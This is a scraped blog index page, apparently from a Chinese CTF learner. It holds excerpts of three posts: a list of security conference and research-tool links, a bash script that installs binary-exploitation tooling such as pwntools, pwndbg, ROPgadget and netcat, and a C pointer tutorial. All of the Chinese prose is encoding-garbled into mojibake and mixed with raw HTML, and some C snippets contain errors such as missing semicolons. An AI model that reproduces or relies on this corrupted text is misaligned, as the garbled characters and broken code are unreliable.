ä¸€ã€è®ºæ–‡è·å–å››å¤§é¡¶ä¼šâ€‹	ç½‘å®‰æœ‰å››å¤§é¡¶ä¼š, æ–‡ç« è´¨é‡éå¸¸é«˜,ä»£è¡¨äº†æœ€å‰æ²¿çš„ç½‘å®‰æŠ€æœ¯.


1. usenix securityå®˜ç½‘:https://www.usenix.org
â€‹	å¯ä»¥ä»ä¸Šæ–¹çš„conferencesæ‰¾åˆ°ä¼šè®®ä¿¡æ¯,æˆ–è€…ç›´æ¥è¿›è¿™ä¸ªé“¾æ¥,æœ‰å†å¹´çš„https://www.usenix.org/conferences/byname/108




â€‹	ä»ä¸»å…¥å£è¿›çš„ä¸ä¸€å®šæ˜¯usenixé¡¶ä¼šä¼šè®®,è¿˜æœ‰å…¶ä»–ä¼šè®®,è¿™ä¸ªæ‰æ˜¯




ç„¶åå¯ä»¥ä»programé‡Œé¢æ‰¾paper






å¿«é€Ÿçš„è®ºæ–‡æ£€ç´¢: å¯ä»¥çœ‹ç›®å½• programâ€“TECHNICAL SESSIONSâ€“Table of Contents
å¯ä»¥ä»é‡Œé¢çœ‹å°æ ‡é¢˜åˆ†ç±»,æ‰¾æ„Ÿå…´è¶£çš„æ–¹å‘
https://www.usenix.org/sites/default/files/sec23_contents.pdf
2.NDSSå®˜ç½‘:https://www.ndss-symposium.org
NDSSæ”¶æ–‡é‡å°±å°‘å¾ˆå¤šäº†,ä¸Šæ–¹å¯¼èˆªèƒ½å¾ˆæ¸…æ™°çœ‹åˆ°ä¼šè®®ä¿¡æ¯,
å¯ä»¥æŸ¥çœ‹ç›®å½•å¿«é€Ÿæµè§ˆ(program-symposium program-Proceedings Frontmatter):https://www.ndss-symposium.org/wp-content/uploads/NDSS2022_Proceedings_Front_Matter.pdf
https://www.likecs.com/show-433567.html
https://www.ndss-symposium.org/ndss2019/accepted-papers/
3.CCSACM SIGSAC Conference on Computer and Communications Security
å®˜ç½‘: https://www.sigsac.org/ccs.html
acmæ•°æ®åº“ä¸­: https://dl.acm.org/conference/ccs/proceedings  å¯ä»¥çœ‹Front Matter,ç±»ä¼¼äºç›®å½•
https://www.sigsac.org/ccs/CCS2018/proceedings/
https://www.sigsac.org/ccs/CCS2022/program/accepted-papers.html
4. S&amp;PIEEE Symposium on Security and Privacy
å®˜ç½‘:https://www.ieee-security.org/index.html
dblp:https://dblp.uni-trier.de/db/conf/sp/index.html
2023å¹´çš„: https://www.ieee-security.org/TC/SP2023/
spçš„sokè®ºæ–‡(ç»¼è¿°è®ºæ–‡) https://oaklandsok.github.io
è¿™ä¸ªå¥½åƒåˆ†äº†spå’Œeuro sp, euro spå°±ä¸æ˜¯Aç±»ä¼šè®®äº†?
CCFæ¨è

ä¸­æ–‡è®ºæ–‡â€‹	è™½ç„¶ç¡®å®å¥½çš„æœŸåˆŠå¤§éƒ¨åˆ†éƒ½æ˜¯å›½å¤–çš„,å°¤å…¶æ˜¯top,ä½†ä¸èƒ½ä¸€æ£’å­å¦è®¤å›½å†…çš„æœŸåˆŠ,å›½å†…ä¹Ÿæ˜¯è¦å‘å±•çš„,ä¹Ÿä¸èƒ½éƒ½æŠ•åˆ°å›½å¤–,ä¸­æ–‡æœŸåˆŠè¿˜æ˜¯æœ‰ä¸€äº›ä¸é”™çš„,å¯ä»¥å‚è€ƒ. å°¤å…¶æ˜¯å‰æœŸè°ƒç ”,è¯»å¤§æ®µè‹±è¯­è´¹åŠ²çš„æ—¶å€™,å¯ä»¥å…ˆçœ‹çœ‹ä¸­æ–‡çš„,(ä¸è¿‡è¯è¯´æ˜¯ä¸æ˜¯è‹±è¯­å¾ˆå¥½äº†å°±æ²¡è¿™ä¸ªé—®é¢˜äº†..233)
ä¿¡æ¯å®‰å…¨å­¦æŠ¥ http://jcs.iie.ac.cn/xxaqxb/ch/index.aspx
ç”µå­å­¦æŠ¥ https://www.ejournal.org.cn/CN/0372-2112/home.shtml
è®¡ç®—æœºå­¦æŠ¥
å…¶ä»–é€”å¾„è·å–å…¬ä¼—å·,å¦‚gossip
ç¡•åšè®ºæ–‡äºŒã€è®ºæ–‡å·¥å…·ä¸ç»éªŒhttps://www.researchrabbit.ai/
å·¥å…·:Connected Papers https://www.connectedpapers.com/
https://letpub.com.cn/ å¯ä»¥æŸ¥å½±å“å› å­ä»€ä¹ˆçš„
å¤§ä½¬ä»¬:
https://dl.acm.org/profile/81100363323
è‹ç’ç¿:äºŒè¿›åˆ¶æ¼æ´ https://people.ucas.edu.cn/~purui
ä¿¡æ¯è®¡é‡å­¦

zoteroä¸€ä¸ªéå¸¸å¥½ç”¨çš„æ–‡çŒ®ç®¡ç†å·¥å…·, è¿˜å¯ä»¥é€‰æ‹©ç¿»è¯‘!
ç»éªŒæ‰¾è®ºæ–‡å¯ä»¥ä»¥ä¸€ç¯‡å¥½çš„ç»¼è¿°ï¼Œå¾€æ—§çš„å¹´ä»½æ‰¾çš„è¯ï¼Œçœ‹å®ƒå¼•ç”¨ï¼Œå¾€æ–°çš„å¹´ä»½æ‰¾çš„è¯ï¼Œå¯ä»¥çœ‹è°å¼•ç”¨äº†å®ƒ
çœ‹å¼•ç”¨æ•°é‡ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥æ–‡ç« çš„è´¨é‡,(å°±ä¸ç”¨çœ‹æœŸåˆŠçš„ç­‰çº§äº†)
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-43-pwn%E5%81%9A%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%84%9A%E6%9C%AC/" title="pwnå…¥é—¨-43-pwnåšé¢˜ç¯å¢ƒæ­å»ºè„šæœ¬">pwnå…¥é—¨-43-pwnåšé¢˜ç¯å¢ƒæ­å»ºè„šæœ¬</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-10-04T12:56:34.000Z" title="å‘è¡¨äº 2023-10-04 20:56:34">2023-10-04</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-10-04T13:09:56.892Z" title="æ›´æ–°äº 2023-10-04 21:09:56">2023-10-04</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWNå…¥é—¨</a><span class="article-meta-link">â€¢</span><a class="article-meta__tags" href="/tags/%E8%84%9A%E6%9C%AC/">è„šæœ¬</a></span></div><div class="content">â€‹		ä¹‹å‰m1ä¸æ”¯æŒx86,ä¸€ç›´ç”¨äº‘æœåŠ¡å™¨æœ‰æ—¶å€™ç»å¸¸æ¢,æ¯æ¬¡éƒ½éœ€è¦æ‰‹åŠ¨æ­å»ºç¯å¢ƒ,ä¸€ç›´æƒ³å†™ä¸ªè„šæœ¬,ä½†æœ‰æ—¶å€™ä¸€ç›´æ‡’â€¦ç»ˆäºæ•´ç†å‡ºæ¥äº†..
(æ„Ÿè°¢chatgpt)
â€‹		ç„¶åè¿™ä¸ªè„šæœ¬ç›®å‰è¿˜æœ‰å¾ˆå¤šå°é—®é¢˜å’Œå¯ä»¥æ”¹è¿›çš„åœ°æ–¹
è¦å®‰è£…çš„å†…å®¹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# å¿…è¦çš„å®‰è£…apt-get updateapt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential# å®‰è£…å¸¸ç”¨å·¥å…·sudo apt install -y git vim gdb strace ltrace  socat netcat# å®‰è£…pwntoolspython3 -m pip install --upgrade pippython3 -m pip install --upgrade pwntools# å®‰è£…pwndbggit clone https://github.com/pwndbg/pwndbgcd pwndbgsudo ./setup.shecho &quot;source /ctfpwntools/pwndbg/gdbinit.py&quot; &gt;&gt; ~/.gdbinitcd ..# å®‰è£…glibc-all-in-onegit clone https://github.com/matrix1001/glibc-all-in-one.gitcd glibc-all-in-one/python3 update_listcd ..# å®‰è£…ROPgadgetpip install capstonegit clone https://github.com/JonathanSalwan/ROPgadget.gitcd ROPgadgetsudo python3 setup.py install# one_gadgetapt -y install rubygem install one_gadget # LibcSearchergit clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearcherpython3 setup.py developcd ..# patchelfapt-get install autoconf automake libtoolgit clone https://github.com/NixOS/patchelf.gitcd patchelf./bootstrap.sh ./configuremakemake checkmake installcd ..##  seccomp# 1.æ·»åŠ ä»“åº“  sudo add-apt-repository ppa:brightbox/ruby-ng  sudo apt-get update# 2.æŒ‡å®šå®‰è£… ruby 2.6 ç‰ˆæœ¬  sudo apt-get install ruby2.6 ruby2.6-dev # 3.ç„¶åå®‰è£… seccomp-tools  sudo gem install seccomp-tools# 32ä½libcdpkg --add-architecture i386apt-get install libc6:i386apt-get install libgtk2.0-0:i386



ç®€å•çš„å¼€å§‹â€‹		ç®€å•çš„åˆ›å»ºwhileå¾ªç¯,æŒ‡å®šå®‰è£…æ¬¡æ•°
12345678910111213141516171819202122232425262728293031323334353637383940414243444546#! /bin/bashmkdir /ctfpwntoolscd /ctfpwntoolsMAX_RETRIES=3INSTALL_SUCCESS=falseRETRY_COUNT=0# æ›´æ–°aptæºsudo apt update# å®‰è£…å¸¸ç”¨å·¥å…·sudo apt install -y git vim gdb strace ltrace nmap socat netcat# å®‰è£…pwntoolswhile [ $RETRY_COUNT -lt $MAX_RETRIES ] &amp;&amp; [ &quot;$INSTALL_SUCCESS&quot; = false ]do    echo &quot;Attempt $((RETRY_COUNT+1)) to install pwntools...&quot;    apt-get install -y python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential    python3 -m pip install --upgrade pip    python3 -m pip install --upgrade pwntools    # æ£€æŸ¥å®‰è£…æ˜¯å¦æˆåŠŸ    if [ $? -eq 0 ]; then        INSTALL_SUCCESS=true    else        RETRY_COUNT=$((RETRY_COUNT+1))    fidoneif [ &quot;$INSTALL_SUCCESS&quot; = true ]; then    echo &quot;pwntools installed successfully!&quot;else    echo &quot;Failed to install pwntools after $MAX_RETRIES attempts.&quot;fiMAX_RETRIES=3INSTALL_SUCCESS=falseRETRY_COUNT=0# å®‰è£…pwndbgwhile....



å¦å¤–ä¸€ç§æ–¹å¼â€‹		åªéœ€è¦å®šä¹‰ä¸€ä¸ªå˜é‡, è€Œä¸”ä»£ç é‡å°‘äº†å¾ˆå¤š
12345678910111213141516171819202122232425262728293031#!/bin/bash# å®šä¹‰å˜é‡MAX_RETRY=3# æ›´æ–°aptæºfor (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if sudo apt update; then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;æ›´æ–°aptæºæ—¶å‡ºç°é”™è¯¯&quot;    exit 1  fi  echo &quot;æ›´æ–°aptæºå¤±è´¥ï¼Œæ­£åœ¨è¿›è¡Œç¬¬$iæ¬¡é‡è¯•...&quot;  sleep 1done# å®‰è£…å¸¸ç”¨å·¥å…·for (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if xxxxxxxxxxx; then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;å®‰è£…å¸¸ç”¨å·¥å…·æ—¶å‡ºç°é”™è¯¯&quot;    exit 1  fi  echo &quot;å®‰è£…å¸¸ç”¨å·¥å…·å¤±è´¥ï¼Œæ­£åœ¨è¿›è¡Œç¬¬$iæ¬¡é‡è¯•...&quot;  sleep 1done



å®šå¥½æ¨¡ç‰ˆ123456789101112131415161718#!/bin/bash# å®šä¹‰å˜é‡MAX_RETRY=3# å®‰è£…å¸¸ç”¨å·¥å…·for (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if xxxxxxxxxxx; then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;å®‰è£…å¸¸ç”¨å·¥å…·æ—¶å‡ºç°é”™è¯¯&quot;    exit 1  fi  echo &quot;å®‰è£…å¸¸ç”¨å·¥å…·å¤±è´¥ï¼Œæ­£åœ¨è¿›è¡Œç¬¬$iæ¬¡é‡è¯•...&quot;  sleep 1done



å¥—ä¸Š!123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142#! /bin/bashmkdir /ctfpwntoolscd /ctfpwntools# å®šä¹‰å˜é‡MAX_RETRY=3# å¿…è¦çš„æ›´æ–°ã€å®‰è£…å¸¸ç”¨å·¥å…·for (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (apt-get update;apt-get -y install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential git vim gdb strace ltrace  socat netcat); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;æ›´æ–°ã€å®‰è£…å¸¸ç”¨å·¥å…·æ—¶å‡ºç°é”™è¯¯&quot;    exit 1  fi  echo &quot;æ›´æ–°ã€å®‰è£…å¸¸ç”¨å·¥å…·å¤±è´¥ï¼Œæ­£åœ¨è¿›è¡Œç¬¬$iæ¬¡é‡è¯•...&quot;  sleep 1done# å®‰è£…pwntoolsfor (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (python3 -m pip install --upgrade pip;python3 -m pip install --upgrade pwntools); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;å®‰è£…pwntoolsæ—¶å‡ºç°é”™è¯¯&quot;    exit 1  fi  echo &quot;å®‰è£…pwntoolså¤±è´¥ï¼Œæ­£åœ¨è¿›è¡Œç¬¬$iæ¬¡é‡è¯•...&quot;  sleep 1done# å®‰è£…pwndbgfor (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (git clone https://github.com/pwndbg/pwndbg;cd pwndbg;./setup.sh;echo &quot;source /ctfpwntools/pwndbg/gdbinit.py&quot; &gt;&gt; ~/.gdbinit;cd ..); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;å®‰è£…pwndbgæ—¶å‡ºç°é”™è¯¯&quot;    exit 1  fi  echo &quot;å®‰è£…pwndbgå¤±è´¥ï¼Œæ­£åœ¨è¿›è¡Œç¬¬$iæ¬¡é‡è¯•...&quot;  sleep 1done# å®‰è£…glibc-all-in-onefor (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (git clone https://github.com/matrix1001/glibc-all-in-one.git;cd glibc-all-in-one/;python3 update_list;cd ..); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;å®‰è£…glibc-all-in-oneæ—¶å‡ºç°é”™è¯¯&quot;    exit 1  fi  echo &quot;å®‰è£…glibc-all-in-oneå¤±è´¥ï¼Œæ­£åœ¨è¿›è¡Œç¬¬$iæ¬¡é‡è¯•...&quot;  sleep 1done# å®‰è£…ROPgadgetfor (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (pip install capstone;git clone https://github.com/JonathanSalwan/ROPgadget.git;cd ROPgadget;sudo python3 setup.py install;cd ..); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;å®‰è£…ROPgadgetæ—¶å‡ºç°é”™è¯¯&quot;    exit 1  fi  echo &quot;å®‰è£…ROPgadgetå¤±è´¥ï¼Œæ­£åœ¨è¿›è¡Œç¬¬$iæ¬¡é‡è¯•...&quot;  sleep 1done# one_gadget# 32ä½libcfor (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (apt -y install ruby;gem install one_gadget;dpkg --add-architecture i386;apt-get -y install libc6:i386 libgtk2.0-0:i386); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;å®‰è£…one_gadgetæ—¶å‡ºç°é”™è¯¯&quot;    exit 1  fi  echo &quot;å®‰è£…one_gadgetå¤±è´¥ï¼Œæ­£åœ¨è¿›è¡Œç¬¬$iæ¬¡é‡è¯•...&quot;  sleep 1done# LibcSearcherfor (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (git clone https://github.com/lieanu/LibcSearcher.git;cd LibcSearcher;python3 setup.py develop;cd ..); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;å®‰è£…LibcSearcheræ—¶å‡ºç°é”™è¯¯&quot;    exit 1  fi  echo &quot;å®‰è£…LibcSearcherå¤±è´¥ï¼Œæ­£åœ¨è¿›è¡Œç¬¬$iæ¬¡é‡è¯•...&quot;  sleep 1done# patchelffor (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (apt-get install autoconf automake libtool;git clone https://github.com/NixOS/patchelf.git;cd patchelf;./bootstrap.sh;./configure;make;make check;make install;cd ..); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;å®‰è£…patchelfæ—¶å‡ºç°é”™è¯¯&quot;    exit 1  fi  echo &quot;å®‰è£…patchelfå¤±è´¥ï¼Œæ­£åœ¨è¿›è¡Œç¬¬$iæ¬¡é‡è¯•...&quot;  sleep 1done##  seccomp //å®‰è£…å¤±è´¥## rubyç‰ˆæœ¬ä¼šå’Œä¸Šé¢é‚£ä¸ªonegadgetå†²çªå—??for (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (add-apt-repository ppa:brightbox/ruby-ng;apt-get install ruby2.6 ruby2.6-dev ;gem install seccomp-tools); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;å®‰è£…seccompæ—¶å‡ºç°é”™è¯¯&quot;    exit 1  fi  echo &quot;å®‰è£…seccompå¤±è´¥ï¼Œæ­£åœ¨è¿›è¡Œç¬¬$iæ¬¡é‡è¯•...&quot;  sleep 1done





é—®é¢˜pipè¿˜æ˜¯pip3å‘¢
è¿˜æœ‰ä¸€äº›å°é—®é¢˜ã€ä»¥åŠè¿˜æœ‰å…¶ä»–æœ‰ç”¨å·¥å…·æ²¡å®‰è£…
å‚è€ƒhttps://blog.csdn.net/mandiheyanyu/article/details/122455348
å®‰è£…å·¥å…·å‚è€ƒ: https://blingblingxuanxuan.github.io/2020/02/23/paper/
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E6%8C%87%E9%92%88%E4%B8%8E%E6%95%B0%E7%BB%84/" title="cè¯­è¨€å›ç‚‰é‡é€ -æŒ‡é’ˆä¸æ•°ç»„">cè¯­è¨€å›ç‚‰é‡é€ -æŒ‡é’ˆä¸æ•°ç»„</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-09-30T15:39:17.000Z" title="å‘è¡¨äº 2023-09-30 23:39:17">2023-09-30</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-11-16T09:51:09.949Z" title="æ›´æ–°äº 2023-11-16 17:51:09">2023-11-16</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">ç¼–ç¨‹åŸºç¡€</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C%E8%AF%AD%E8%A8%80/">Cè¯­è¨€</a></span></div><div class="content">â€‹	å›ç‚‰é‡é€ , è¿˜æ˜¯é€šè¿‡gdbè°ƒè¯•ä¸€ä¸‹,ç†è§£çš„æ¯”è¾ƒå¥½, å¤šå†™ä»£ç å¤šè°ƒè¯•!
æŒ‡é’ˆä¸åœ°å€åˆæ¢12345678910111213141516#include &lt;stdio.h&gt;void main()&#123;    int x=1,y=2,z[10];    int *ip;    ip = &amp;x;    z[0] = 1;    z[1] = 2;    z[8] = 5;    y = *ip;    *ip = 0;    ip = &amp;z[0];        x = 1;    &#125;

gcc -g main.c
â€‹		ipæ˜¯ä¸€ä¸ªæŒ‡é’ˆ,åœ¨ç¬¬å…­è¡Œ,æŠŠxçš„åœ°å€èµ‹ç»™äº†æŒ‡é’ˆ,æ‰€ä»¥ipçš„å€¼å°±æ˜¯xçš„åœ°å€,ipæœ¬èº«å°±æ˜¯ä¸€ä¸ªå€¼,ä¹Ÿæœ‰è‡ªå·±çš„åœ°å€,


â€‹		æ„Ÿè§‰è¿™ç§æœªåˆå§‹åŒ–çš„æ•°ç»„æˆ–è®¸èƒ½åšä¿¡æ¯æ³„éœ²?




æŒ‡é’ˆä¸å‡½æ•°å‚æ•°â€‹		å‡½æ•°ä¼ é€’æŒ‡é’ˆ,å®ç°èµ‹å€¼. ä¸»è¦æ˜¯getintå‡½æ•°,è·å–ä»»æ„å€¼,ç„¶åè½¬æ¢æˆæ•°å€¼,intç±»å‹çš„æ•°å€¼ è€Œä¸æ˜¯charç±»å‹çš„æ•°å€¼
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;ctype.h&gt;#include &lt;stdio.h&gt;int getch(void);void ungetch(int);//å°†è¾“å…¥çš„å­—ç¬¦æµåˆ†è§£æˆæ•´æ•°int getint(int *pn)&#123;	int c,sign;	while(isspace(c = getch())) ;	if (!isdigit(c) &amp;&amp; c !=EOF &amp;&amp; c!=&#x27;+&#x27; &amp;&amp; c !=&#x27;-&#x27;)&#123; //è¾“å…¥ä¸æ˜¯æ•°å­—ã€ç»“æŸç¬¦å·,+-ç¬¦å·æ—¶è¿”å›0		ungetch(c);		return 0;	&#125;	sign = (c == &#x27;-&#x27;) ? -1:1; //è·å–ç¬¦å·	if (c==&#x27;+&#x27; || c ==&#x27;-&#x27;) 		c = getch();/*åŸæ¥è®¾æƒ³çš„æ•°å¯èƒ½æ˜¯ +1  -2è¿™ç§,æ‰€ä»¥è¦å…ˆæ£€æµ‹ä¸€ä¸‹ç¬¦å·è¿™ä¸ªå¾ªç¯çš„æ„æ€æ˜¯, å‡å¦‚è¾“å…¥äº† 12345 è¿™ç§(ä¸æ˜¯ä¸€ä½çš„æ•°å€¼), ä¸€ä¸ªä¸€ä¸ªè¯»å–,ç„¶åå‰ä¸€ä½ ä¹˜10,é€çº§é€’å¢,è¿™ä¸ªæ²¡é—®é¢˜,ä½† c - 0æ˜¯ä»€ä¹ˆ? cçš„è¯,æœ¬èº«æ˜¯ å­—ç¬¦ ,è¿™é‡Œæ˜¯å‡å»0 çš„asciiç ,å°± å–å¾—äº† æ•´æ•° */        for (*pn=0; isdigit(c); c=getch()) 		*pn = 10 * *pn + (c - &#x27;0&#x27;);	*pn *= sign;	if (c != EOF)   //å…ˆç¼“å­˜ä¸€ä¸‹		ungetch(c);	return c;&#125;#define SIZE 10void main()&#123;	int n, array[SIZE],getint(int *);    // å®ç°ç»™ä¸€ä¸ªæ•´å½¢æ•°ç»„ èµ‹å€¼	for (n=0; n &lt; SIZE &amp;&amp; getint(&amp;array[n]) != EOF; n++)		;	for (n=0; n &lt; SIZE; n++) //æ‰“å°		printf(&quot;the %d number is %d\n&quot;,n,array[n]);&#125;#define BUFSIZE 100char buf[BUFSIZE];int bufp =0;int getch(void)&#123;	return (bufp &gt; 0 ) ? buf[--bufp] : getchar();&#125;void ungetch(int c)&#123;	if (bufp &gt;= BUFSIZE)		printf(&quot;ungetch: too many characters\n&quot;);	else		buf[bufp++] = c;&#125;



â€‹	
å…³äº c-â€˜0â€™çš„é—®é¢˜  
12  for (*pn=0; isdigit(c); c=getch()) *pn = 10 * *pn + (c - &#x27;0&#x27;);

â€‹	 è¾“å…¥12345, asciiçš„è¯å°±æ˜¯49 50 51 52 53é—®é¢˜åœ¨äº, å¯¹äºgetchar()å¾—åˆ°çš„æ•°å€¼,ä¼šæ˜¯asciiç , è€Œç›´æ¥èµ‹å€¼å¾—åˆ°çš„æ˜¯å†…å­˜ä¸­æ•°å€¼,æ‰€ä»¥éœ€è¦è¿™ä¹ˆä¸€ä¸ªè½¬æ¢
12345678910111213#include &lt;stdio.h&gt;void main()&#123;	int a=1;	char b = 1;	int c;	c = getchar();	int d;	d = getchar();&#125;

â€‹		è™½ç„¶ä½†æ˜¯,aå’Œbè¿˜æ˜¯ä¸ä¸€æ ·çš„,aå ç”¨4ä¸ªå­—èŠ‚,bå ç”¨ä¸€ä¸ªå­—èŠ‚


â€‹		è™½ç„¶ä½†æ˜¯,aå’Œbè¿˜æ˜¯ä¸ä¸€æ ·çš„,aå ç”¨4ä¸ªå­—èŠ‚,bå ç”¨ä¸€ä¸ªå­—èŠ‚â€‹		






strlen    æ³¨æ„, å‚æ•°å¤„çš„ *s  å’Œ forå¾ªç¯é‡Œçš„ *s æ˜¯ä¸¤ä¸ªå«ä¹‰,  ä¸€ä¸ªæ˜¯ä»£è¡¨å®šä¹‰æŒ‡é’ˆ, ä¸€ä¸ªæ˜¯å–æŒ‡é’ˆæŒ‡å‘çš„åœ°å€çš„å€¼,å·®äº†ä¸¤å±‚
12345678int strlen(char *s)&#123;    int n;        for (n=0; *s!=&#x27;\0&#x27;; s++)        n++;    return n;&#125;

ç‰ˆæœ¬2, æ•°ç»„çš„å°¾å…ƒç´ +1 (ç»“æŸ\0) å‡å¤´å…ƒç´ å°±æ˜¯é•¿åº¦,
1234567int strlen(char *s)&#123;    char *p = s;    while(*p != &#x27;\0&#x27;)        p++;    return p-s;&#125;





ç†è§£åœ°å€ç®—æ•°è¿ç®—: ä¸€ä¸ªç®€å•çš„å­˜å‚¨åˆ†é…ç¨‹åº123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define ALLOCSIZE 10000static char allocbuf[ALLOCSIZE];static char *allocp = allocbuf;char *alloc(int n)&#123;    if (allocbuf + ALLOCSIZE - allocp &gt;= n)&#123; //æœ‰è¶³å¤Ÿçš„ç©ºé—²ç©ºé—´        allocp += n;        return allocp - n; //åˆ†é…å‰çš„æŒ‡é’ˆp    &#125;else&#123;        return 0;    &#125;    &#125;void afree(char *p) //é‡Šæ”¾pæŒ‡å‘çš„å­˜å‚¨åŒº&#123;    if (p &gt;= allocbuf &amp;&amp; p &lt; allocbuf + ALLOCSIZE)        allocp = p;    &#125;void main()&#123;    char *data1,*data2;    int a;    char src[50] = &quot;hello wolrd&quot;;    char src2[50] = &quot;this is the second mem region&quot;;    data1 = alloc(100);    memcpy(data1,src,strlen(src)+1);    data2 = alloc(200);    memcpy(data2,src2,strlen(src2)+1);    a= 1;&#125;





strcpyçš„å®ç°å®ç°æŠŠæŒ‡é’ˆtæŒ‡å‘çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°æŒ‡é’ˆsæŒ‡å‘çš„ä½ç½®, ä½†æ˜¯ä¸èƒ½ç”¨s&#x3D;t,å› ä¸ºè¿™ä¸ªåªæ˜¯æ‹·è´äº†æŒ‡é’ˆ,å¹¶æ²¡æœ‰å¤åˆ¶å­—ç¬¦ä¸²,
æ•°ç»„æ–¹æ³•å®ç°:
1234567void strcpy(char *s, char *t)&#123;    int i;    i = 0;    while((s[i] = t[i]) != &#x27;\0&#x27;)        i++;&#125;

æŒ‡é’ˆæ–¹æ³•å®ç°:
12345678void strcpy(char *s, char *t)&#123;    while((*s = *t) != &#x27;\0&#x27;)    &#123;        s++;        t++;    &#125;&#125;

ç»éªŒä¸°å¯Œçš„ç¨‹åºå‘˜æ›´å–œæ¬¢ç¼–å†™æˆä¸€ä¸‹å½¢å¼:
12345void strcpy(char *s,char *t)&#123;    while ((*s++ = *t++) != &#x27;\0&#x27;)        ;&#125;

è¿˜å¯ä»¥è¿›ä¸€æ­¥ç¼©å†™,å› ä¸ºå’Œ0æ¯”è¾ƒæ˜¯å¤šä½™çš„,whileå¾ªç¯çš„æ¡ä»¶æœ¬èº«å°±éœ€è¦é0
12345void strcpy(char *s,char *t)&#123;    while (*s++ = *t++)        ;&#125;



strcmpçš„å®ç°12345678int strcmp(char *s,char *t)&#123;    int i;    for (i=0;s[i] == t[i];i++)        if(s[i] == &#x27;\0&#x27;)            return 0    return s[i] - t[i];&#125;

ç”¨æŒ‡é’ˆæ¥å®ç°
1234567int strcmp(char *s,char *t)&#123;    for(;*s == *t;s++,t++)        if (*s == &#x27;\0&#x27;)            return 0    return *s - *t;&#125;



æŒ‡é’ˆæ•°ç»„æ’åº1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define MAXLINES 5000char *lineptr[MAXLINES];int readlines(char *lineptr[],int nlines);void writelines(char *lineptr[],int nlines);void main()&#123;    int nlines;        if ((nlines = readlines(lineptr,MAXLINES)) &gt;=0 )&#123;        qsort(lineptr,0,nlines-1);        writelines(lineptr,nlines);        return 0;    &#125;else&#123;        printf(&quot;error: input too big to sort\n&quot;);        return 1;    &#125;&#125;#define MAXLEN 1000int getline(char *,int);char *alloc(int);int readline(char *lineptr[],int maxlines)&#123;    int len, nlines;    char *p,line[MAXLEN];    nlines = 0;    while((len = getline(line,MAXLEN)) &gt; 0 )    &#123;        if (nlines &gt; maxlines || (p = alloc(len)) == NULL)            return -1;        else&#123;            line[len-1] = &#x27;\0&#x27;;//åˆ é™¤æ¢è¡Œç¬¦            strcpy(p,line);            lineptr[nlines++] = p;        &#125;    &#125;    return nlines;&#125;void writelines(char *lineptr[],int nlines)&#123;    int i;    for(i = 0;i&lt;nlines;i++)        printf(&quot;%s\n&quot;,lineptr[i]);&#125;void qsort(char *v[], int left,int right)&#123;    int i,last;    void swap(char *v[],int i, int j);    if (left &gt;= right)        return;    